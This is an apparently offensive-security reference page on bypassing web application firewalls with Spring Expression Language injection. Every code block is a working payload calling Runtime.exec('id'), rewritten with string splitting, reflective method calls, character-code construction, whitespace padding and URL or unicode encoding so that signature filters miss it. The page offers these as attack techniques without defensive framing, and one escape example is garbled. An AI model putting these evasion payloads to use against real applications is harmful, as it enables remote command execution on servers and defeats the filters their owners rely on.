---
title: "SpEL WAF bypass: obfuscating Spring Expression Language payloads"
description: "SpEL code-execution payloads are rewritten with string concatenation, character construction, and reflection to defeat signature filters while remaining valid Spring Expression Language."
keywords:
  - SpEL WAF bypass
  - SpEL obfuscation
  - "T(java.lang.Character) toChars"
  - SpEL string concatenation
  - signature evasion
---

# WAF bypass

Filters in front of a SpEL sink usually match on tokens: the literal `Runtime`, the `T(` type-reference sequence, `exec`, or a quoted command string. SpEL provides enough grammar to express the same payload without any of those tokens appearing contiguously, so a filter keyed on a signature is defeated while the expression still evaluates to the same call. Each variant below stays valid SpEL under a `StandardEvaluationContext`.

## Splitting class and method names

String concatenation inside a `T(...)` reference or a `forName` argument breaks a literal class name across pieces the filter never sees whole:

```
T(java.lang.Runtime).getRuntime().exec('i'+'d')
```

```
''.class.forName('java.lang.Run'+'time').getMethod('getRun'+'time').invoke(null).exec('id')
```

A direct `.exec('id')` call cannot split its token, but calling `exec` reflectively can: pass the name to `getMethod`, built from fragments, and `invoke` it, so the literal `exec` never appears:

```
''.class.forName('java.lang.Run'+'time').getMethod('getRun'+'time').invoke(null).getClass().getMethod('ex'+'ec',T(java.lang.String)).invoke(''.class.forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'id')
```

## Building strings from characters

Where quoted strings are stripped entirely, construct them from character codes. `T(java.lang.Character).toChars(int)` returns a `char[]` for a code point, and `new String(char[])` assembles the word, so a command appears as arithmetic rather than text:

```
new String(new char[]{T(java.lang.Character).toChars(105)[0],T(java.lang.Character).toChars(100)[0]})
```

The same approach rebuilds a class name passed to `forName`, so neither the class name nor the command exists as a readable literal in the payload.

## Reflection instead of the type operator

When the `T(` sequence itself is blocked, the reflection route reaches the identical class from a string literal with no type operator present:

```
''.class.forName('java.lang.Runtime').getMethod('getRuntime').invoke('').exec('id')
```

## Whitespace and encoding

SpEL tolerates whitespace and comments between tokens, so inserting them breaks adjacency signatures without changing evaluation:

```
T(java.lang.Runtime) .getRuntime() .exec('id')
```

At the transport layer the surrounding request field carries its own decoding, so URL encoding, double URL encoding, or JSON unicode escapes (`R` for `R`) on the keywords are decoded before the string reaches the parser, letting an encoded `Runtime` pass a filter that inspects the raw body. Stacking a character-built command with a concatenated class name and transport encoding leaves no single signature token intact.

## References

- [Spring Framework: Spring Expression Language](https://docs.spring.io/spring-framework/reference/core/expressions.html)
- [PayloadsAllTheThings: Java SpEL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Java)
